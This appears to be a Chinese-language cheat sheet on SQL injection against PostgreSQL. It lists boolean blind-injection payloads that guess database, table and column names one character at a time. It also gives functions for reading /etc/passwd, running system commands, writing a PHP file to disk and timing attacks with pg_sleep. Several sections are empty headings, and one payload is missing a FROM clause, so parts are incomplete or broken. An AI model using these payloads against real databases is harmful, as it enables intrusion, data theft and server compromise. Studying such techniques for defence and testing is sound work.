## PostgreSQL数据库的注入
### 一、联合注入


### 二、报错注入


### 三、布尔盲注
```sql
--先猜当前数据库的长度
and (select length(current_database())) between 0 and 30

--ascii猜解库名的每个字符
and (select ascii(substr(current_database(),1,1))) between 0 and 30

---猜解数据库的表的个数
and (select count(*) from pg_stat_user_tables) between 0 and 30

--猜解库里的表名的长度
and (select length(relname) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--猜解表名里面的每个字符
and (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--接下来猜解字段名
and (select+ascii(substr(column_name,1,1)) information_schema.columns where table_name=aaa) between 0 and 30
```

### 四、时间盲注

### 五、PostgreSQL语法
#### 常用语法
select CURRENT_SCHEMA()           #查看当前权限
select user                       #查看用户
select current_user               #查看当前用户
select chr(97)                    #将ASCII码转为字符
select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
select version()                  #查看PostgreSQL数据库版本
SELECT current_database()         #查看当前数据库
select length('admin')            #查看长度
select case when(expr1) then result1 else result2 end;  #如果xx，执行result1，否则result2
例：select case when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;
select pg_read_file('/etc/passwd');          #读取文件
select system('whoami');                     #执行系统命令,11.2以下才有该命令
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';   #写入文件

#### 注意点
此数据库有一个特性，使用like查询子句时，比如：
```SQL
where aaa like '%aaa%';
```
这里单引号可以使用$$代替，如:
```SQL
where aaa like $$%aaa%$$;
```
但是暂时不知道原因！
